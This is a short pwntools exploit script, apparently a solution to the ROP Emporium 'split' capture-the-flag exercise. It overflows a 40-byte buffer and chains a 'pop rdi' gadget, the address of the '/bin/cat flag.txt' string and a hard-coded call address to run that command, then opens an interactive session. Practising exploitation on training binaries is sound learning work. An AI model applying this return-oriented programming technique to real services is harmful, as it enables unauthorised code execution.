from pwn import *

elf = ELF('./split')
rop = ROP(elf)

conn = process('./split')

print(type(rop.rdi.address))

payload = b'A'*40
payload += p64(rop.rdi.address)
payload += p64(next(elf.search(b'/bin/cat flag.txt')))
payload += p64(0x40074b)

conn.sendafter('> ', payload)
conn.interactive()